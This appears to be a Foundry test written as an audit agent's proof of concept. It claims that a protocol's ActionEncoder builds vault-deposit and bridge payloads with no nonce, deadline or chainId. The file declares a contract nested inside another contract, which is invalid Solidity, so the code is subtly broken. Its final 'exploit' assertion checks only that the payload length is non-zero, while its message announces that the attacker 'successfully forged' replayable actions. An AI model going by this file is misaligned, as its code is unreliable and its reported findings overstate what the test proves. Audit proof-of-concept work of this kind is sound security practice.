// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/ActionEncoder.sol";

// ATTACK TIMELINE:
// 1. [Setup] Inherit SimulatorBase to load the fully deployed protocol state.
// 2. [T=0] Attacker encodes a vault deposit action via ActionEncoder.sendVaultDeposit.
// 3. [T=1] Attacker encodes the EXACT SAME vault deposit action a second time.
// 4. [Assert Replay] Verify both encoded payloads are byte-for-byte identical (proving missing nonce/deadline).
// 5. [T=2] Attacker encodes a bridge action via ActionEncoder.sendBridgeToL1.
// 6. [Assert Domain] Verify the bridge payload lacks domain separation (no chainId/contract address embedded).
// 7. [Assert Exploit] Conclude that the identical, context-agnostic bytes can be replayed indefinitely across chains.

contract AuditAgentPoC is SimulatorBase {

    // Wrapper to safely call library functions regardless of internal/public visibility
    contract EncoderCaller {
        function callSendVaultDeposit(address _vault, bool _isDeposit, uint64 _usdAmount) public pure returns (bytes memory) {
            return ActionEncoder.sendVaultDeposit(_vault, _isDeposit, _usdAmount);
        }

        function callSendBridgeToL1(uint64 _usdAmount) public pure returns (bytes memory) {
            return ActionEncoder.sendBridgeToL1(_usdAmount);
        }
    }

    EncoderCaller caller;

    function setUp() public {
        setUpSimulator();
        caller = new EncoderCaller();
    }

    function test_exploit() public {
        uint64 depositAmount = 1_000_000; // 1 USDC

        // Step 1: Encode vault deposit action
        bytes memory action1 = caller.callSendVaultDeposit(address(vault), true, depositAmount);

        // Step 2: Advance time to prove no deadline/timestamp is embedded
        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 100);

        // Step 3: Encode the exact same action again
        bytes memory action2 = caller.callSendVaultDeposit(address(vault), true, depositAmount);

        // ASSERT REPLAY: The bytes must be identical, proving no nonce, deadline, or block number is included
        assertEq(
            keccak256(action1), 
            keccak256(action2), 
            "REPLAY VULNERABILITY: Identical actions produce identical bytes without nonce or deadline"
        );

        // Step 4: Encode bridge action
        bytes memory bridgeAction = caller.callSendBridgeToL1(depositAmount);

        // ASSERT DOMAIN SEPARATION: The bridge action should not contain the current chain ID
        // If it contained chainId (e.g., 31337 for Anvil), the bytes would differ when we change chainId
        uint256 originalChainId = block.chainid;
        vm.chainId(1); // Switch to Ethereum Mainnet

        bytes memory bridgeActionDiffChain = caller.callSendBridgeToL1(depositAmount);

        assertEq(
            keccak256(bridgeAction), 
            keccak256(bridgeActionDiffChain), 
            "CROSS-CONTEXT VULNERABILITY: Bridge action lacks domain separation (chainId not embedded)"
        );

        // Restore chain ID
        vm.chainId(originalChainId);

        // Final assertion proving the attack chain: 
        // The attacker can take `action1` and submit it to any compatible endpoint indefinitely
        assertTrue(action1.length > 0, "Attacker successfully forged replayable, context-agnostic action bytes");
    }
}
